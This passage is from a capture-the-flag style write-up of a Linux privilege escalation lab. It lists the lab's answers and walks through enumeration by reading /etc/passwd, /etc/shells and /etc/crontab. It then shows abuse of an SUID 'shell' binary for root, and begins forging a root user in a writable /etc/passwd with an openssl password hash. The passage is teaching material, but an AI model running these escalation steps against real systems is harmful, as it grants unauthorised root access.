0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>polobox</code></p><ol start="3"><li>Look at the output of /etc/passwd how many &quot;user<!-- -->[x]<!-- -->&quot; are there on the system?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ hostname</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">polobox</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ cat /etc/passwd </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:x:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">syslog:x:104:108::/home/syslog:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">_apt:x:105:65534::/nonexistent:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">messagebus:x:106:110::/var/run/dbus:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uuidd:x:107:111::/run/uuidd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lightdm:x:108:117:Light Display Manager:/var/lib/lightdm:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ntp:x:109:119::/home/ntp:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">avahi:x:110:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">colord:x:111:123:colord colour management daemon,,,:/var/lib/colord:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nm-openconnect:x:114:124:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nm-openvpn:x:115:125:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pulse:x:116:126:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rtkit:x:117:128:RealtimeKit,,,:/proc:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">saned:x:118:129::/var/lib/saned:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">geoclue:x:103:105::/var/lib/geoclue:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">vboxadd:x:999:1::/var/run/vboxadd:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user1:x:1000:1000:user1,,,:/home/user1:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user2:x:1001:1001:user2,,,:/home/user2:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3:x:1002:1002:user3,,,:/home/user3:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4:x:1003:1003:user4,,,:/home/user4:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5:x:1004:1004:user5,,,:/home/user5:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user6:x:1005:1005:user6,,,:/home/user6:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:x:121:131:MySQL Server,,,:/var/mysql:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7:x:1006:0:user7,,,:/home/user7:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8:x:1007:1007:user8,,,:/home/user8:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:x:122:65534::/run/sshd:/usr/sbin/nologin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user6</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>8</code></p><ol start="4"><li>How many available shells are there on the system?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ cat /etc/shells</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># /etc/shells: valid login shells</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/dash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/bin/rbash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>4</code></p><ol start="5"><li>What is the name of the bash script that is set to run every 5 minutes by cron?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ cat /etc/crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># /etc/crontab: system-wide crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># command to install the new version when you edit this file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># and files in /etc/cron.d. These files also have username fields,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># that none of the other crontabs do.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SHELL=/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># m h dom mon dow user  command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*/5  *    * * * root    /home/user4/Desktop/autoscript.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>autoscript.sh</code></p><ol start="6"><li>What critical file has had its permissions changed to allow some users to write to it?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-rw-r--   1 root  root     2694 Mar  6  2020 passwd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/etc/passwd</code></p><ol start="7"><li>Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-5-abusing-suidguid-files">Task 5 Abusing SUID/GUID Files<a href="#task-5-abusing-suidguid-files" class="hash-link" aria-label="Direct link to Task 5 Abusing SUID/GUID Files" title="Direct link to Task 5 Abusing SUID/GUID Files"></a></h2><p><strong>Finding and Exploiting SUID Files</strong></p><p>The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p><p><strong>What is an SUID binary?</strong></p><p>As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:</p><ul><li>r = read</li><li>w = write</li><li>x = execute</li></ul><table><thead><tr><th>user</th><th>group</th><th>others</th></tr></thead><tbody><tr><td>rwx</td><td>rwx</td><td>rwx</td></tr><tr><td>421</td><td>421</td><td>421</td></tr></tbody></table><p>The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using <strong>&quot;chmod&quot;</strong> as <strong>755</strong>, then it will be: rwxr-xr-x.</p><p>But when special permission is given to each user it becomes SUID or SGID. When extra bit <strong>4</strong> is set to user(Owner) it becomes <strong>SUID</strong> (Set user ID) and when bit <strong>2</strong> is set to group it becomes <strong>SGID</strong> (Set Group ID).</p><p>Therefore, the permissions to look for when looking for SUID is:</p><p>SUID: rws-rwx-rwx</p><p>GUID: rwx-rws-rwx</p><p><strong>Finding SUID Binaries</strong></p><p>We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: &quot;find / -perm -u=s -type f 2&gt;/dev/null&quot; to search the file system for SUID/GUID files. Let&#x27;s break down this command.</p><ul><li><code>find</code> - Initiates the &quot;find&quot; command</li><li><code>/</code> - Searches the whole file system</li><li><code>-perm</code> - searches for files with specific permissions</li><li><code>-u=s</code> - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form</li><li><code>-type f</code> - Only search for files</li><li><code>2&gt;/dev/null</code> - Suppresses errors</li></ul><ol><li>What is the path of the file in user3&#x27;s directory that stands out to you?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/home/user3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ ls -la</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 156</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 22 user3 user3 4096 Mar  2  2020 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 10 root  root  4096 Jun  5  2019 ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3  124 Jun  4  2019 .asoundrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3    0 Mar  4  2020 .bash_history</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3  220 Jun  4  2019 .bash_logout</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3  952 Mar  2  2020 .bashrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 15 user3 user3 4096 Oct 19 13:28 .cache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 20 user3 user3 4096 Jun  4  2019 .config</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .dbus</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Desktop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3   23 Jun  4  2019 .dmrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Documents</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Downloads</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3 9354 Jun  4  2019 .face</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 .gconf</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x 24 user3 user3 4096 Jun  4  2019 .gimp-2.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3    0 Jun  4  2019 .gksu.lock</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .gnome</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .gnome2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .gnupg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3   20 Jun  4  2019 .gtk-bookmarks</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3  105 Jun  4  2019 .gtkrc-2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------  1 user3 user3 4710 Jun  4  2019 .ICEauthority</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  5 user3 user3 4096 Jun  4  2019 .mozilla</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Music</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Pictures</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3  873 Jun  4  2019 .profile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Public</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xrwx  1 root  root    33 Jun  4  2019 .script.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwsr-xr-x  1 root  root  8392 Jun  4  2019 shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3    0 Jun  4  2019 .sudo_as_admin_successful</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Templates</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  3 user3 user3 4096 Jun  4  2019 .thumbnails</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  4 user3 user3 4096 Jun  4  2019 .thunderbird</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x  2 user3 user3 4096 Jun  4  2019 Videos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--  1 user3 user3   50 Jun  4  2019 .Xauthority</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>/home/user3/shell</code></p><ol start="2"><li>We know that &quot;shell&quot; is an SUID bit file, therefore running it will run the script as a root user! Lets run it! We can do this by running: &quot;./shell&quot;</li></ol><p><code>No answer needed</code></p><ol start="3"><li>Congratulations! You should now have a shell as root user, well done!</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-6-exploiting-writeable-etcpasswd">Task 6 Exploiting Writeable /etc/passwd<a href="#task-6-exploiting-writeable-etcpasswd" class="hash-link" aria-label="Direct link to Task 6 Exploiting Writeable /etc/passwd" title="Direct link to Task 6 Exploiting Writeable /etc/passwd"></a></h2><p><strong>Exploiting a writable /etc/passwd</strong></p><p>Continuing with the enumeration of users, we found that user7 is a member of the root group with gid 0. And we already know from the LinEnum scan that /etc/passwd file is writable for the user. So from this observation, we concluded that user7 can edit the /etc/passwd file.</p><p><strong>Understanding /etc/passwd</strong></p><p>The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the systems accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.</p><p>The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn&#x27;t, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.</p><p><strong>Understanding /etc/passwd format</strong></p><p>The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:</p><p><code>test:x:0:0:root:/root:/bin/bash</code></p><p>[as divided by colon (:)]</p><ol><li><strong>Username</strong>: It is used when user logs in. It should be between 1 and 32 characters in length.</li><li><strong>Password</strong>: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an &quot;x&quot;.</li><li><strong>User ID (UID)</strong>: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.</li><li><strong>Group ID (GID)</strong>: The primary group ID (stored in /etc/group file)</li><li><strong>User ID Info</strong>: The comment field. It allow you to add extra information about the users such as users full name, phone number etc. This field use by finger command.</li><li><strong>Home directory</strong>: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /</li><li><strong>Command/shell</strong>: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.</li></ol><p><strong>How to exploit a writable /etc/passwd</strong></p><p>It&#x27;s simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!</p><ol><li>First, let&#x27;s exit out of root from our previous task by typing &quot;<strong>exit</strong>&quot;. Then use &quot;<strong>su</strong>&quot; to swap to <strong>user7</strong>, with the password &quot;<strong>password</strong>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ su - user7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 13:40:24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 336/1991MB (16.88%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user7@polobox:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="2"><li>Having read the information above, what direction privilege escalation is this attack?</li></ol><p><code>vertical</code></p><ol start="3"><li>Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: &quot;<code>openssl passwd -1 -salt [salt] [password]</code>&quot; What is the hash created by using this command with the salt, &quot;<strong>new</strong>&quot; and the password &quot;<strong>123</strong>&quot;?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" 